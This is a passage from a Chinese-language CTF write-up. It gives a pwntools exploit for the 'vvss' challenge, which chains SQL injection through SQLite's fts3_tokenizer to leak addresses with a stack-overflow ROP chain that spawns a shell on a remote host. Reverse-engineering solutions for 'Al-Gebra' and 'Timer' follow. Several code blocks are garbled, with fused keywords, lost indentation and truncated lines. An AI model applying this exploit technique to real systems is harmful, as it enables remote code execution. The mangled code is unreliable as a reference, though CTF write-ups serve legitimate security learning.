    return
    if __name__ == '__main__':
        pwn()
**vvss**
**sqli + 栈溢出, 利用见脚本:**
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    import os
    # flag : alictf{n0t_VerY_v3ry_secure_py}
    # switches
    DEBUG = 0
    # modify this
    if DEBUG:
        io = process('./vvss')
    else:
        io = remote('120.26.120.82',9999)
    context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
    return io.recvuntil(delim)
    def rn(count):
    return io.recvn(count)
    def sl(data):
    return io.sendline(data)
    def sn(data):
    return io.send(data)
    def info(string):
    return log.info(string)
    # define interactive functions here
    def listall():
        sl('py')
    return
    # select plain, len from keys where qid='%s'
    def query(param):
        buf = 'pz'
        buf += param
        sl(buf)
    return
    def todo():
        buf = 'pi'
        sl(buf);
    return
    # define exploit function here
    def pwn():
    if DEBUG: gdb.attach(io)
    #listall()
        query("a';insert into keys values (909, hex(fts3_tokenizer('simple')), 'bx', 100);")# use tokenizer to leak address
        query("bx")
        offset = 0x2b4d80
        ru('0')
        buf = rn(16)
        sqlite_base = u64(buf.decode('hex')) - offset
        info('SQLite Base leaked = ' + hex(sqlite_base))
        offset2lib = 0x3c5000
        libc = sqlite_base - offset2lib
        system = libc + 0x46590
        binsh = libc + 0x17C8C3
        ropchain = ''
        ropchain += p64(sqlite_base + 0x0000000000009ef8)
        ropchain += p64(binsh)
        ropchain += p64(system)
        payload = 656 * 'a' + ropchain
        query("a';insert into keys values (31337, x'"+payload.encode('hex')+"', 'exx', "+str(len(payload))+");")
        query("exx")
        io.interactive()
    return
    if __name__ == '__main__':
        pwn()
**Reverse**
**Al-Gebra**
一个pyinstaller打包的程序。用pyinstxtractor.py解包,然后发现主要文件是pyimod04_builtins,修复文件头之后反编译,获得主程序代码。
主程序从服务器获取了数据和两个函数 add和mul。
保存服务器发来的数据然后修复文件头反编译,得到函数内容。
程序逻辑就是做个矩阵乘法,然后检验结果。但是这里的加法和乘法都被重新定义过了。网上搜了下,发现这玩意好像叫多项式环。
直接对mul函数进行一些测试。发现对于mul(a,x)=b,a> 1
    return r
    def run():
    lum =[[jfor j inrange(0, 256)]for i inrange(0, 256)]
    for i inrange(0, 256):
    for j inrange(0, 256):
    lum[i][mul(i,j)]= j
    for j inxrange(len(mat[0])):
    # print j
    # print_mat()
    end = length -1
    for i inrange(j, length):
    if end ==i:
    #print end
    break
    ifmat[i][j]==0:
    swap_line(i, end)
    end -=1
    # change to 1
    for i inrange(j, length):
    ifmat[i][j]==0:
    break
    mul_line(i, lum[mat[i][j]][1])
    # print_mat()
    # up minus all
    for i inrange(j +1, length):
    ifmat[i][j]==0:
    break
    minus_line(j, i)
    # print_mat()
    ans =[]
    #print c
    for j inrange(length -1, -1, -1):
    xn=lum[1][c[j]]
    ans.append(chr(xn))
    for i inrange(j, -1, -1):
    c[i] ^= mul(xn, mat[i][j])
    # print_mat()
    print"".join(ans[::-1])
    run()
**Timer**
逆向so里的函数,然后直接爆破。
代码写炸了,得到一组结果。。然后找到一些比较像flag的一个个试的
    alictf{Y0vAr3TimerMa3te7}
    #include "cstdio"
    #include "cmath"
    boolisPrime(int x){
    if(x<=1)
    return false;
    for(int i=2;i<=sqrt(x);i++){
    if (x%i==0){
    return false;
    }
    }
    return true;
    }
    intfunc(intinput)
    {
    int v3; // r0@1
    int v4; // r6@1
    int v5; // r1@1
    int v6; // r7@1
    int v7; // r0@1
    int v8; // r4@1
    longlong v9; // r0@2
    int v10; // r0@2
    int v11; // r1@2
    int v12; // r0@2
    int v13; // r0@2
    unsigned int v14; // r1@2
    longlong v15; // r0@2
    int v16; // r0@2
    unsigned int v17; // r0@2
    int v18; // r0@3
    int v19; // r0@6
    intv20;// r0@6
    intv21;// r0@6
    intv22;// r0@6
    intv23;// r0@6
    intv24;// r0@6
    intv25;// r0@6
    charv26;// r0@6
    intresult;// r0@6
    signed intv29;//[sp+8h][bp-38h]@1
    int v30; //[sp+Ch][bp-34h]@1
    charv31[18];//[sp+10h][bp-30h]@1
    int v32; //[sp+24h][bp-1Ch]@1
    v29=input;
    double b1 =input;
    double b13,b15;
    v7 = b1/323276.0999999999800;
    v8 = v7;
    v31[0]= v8 +v29%100;
    if ( isPrime((v8+v29%100) & 0xFF) )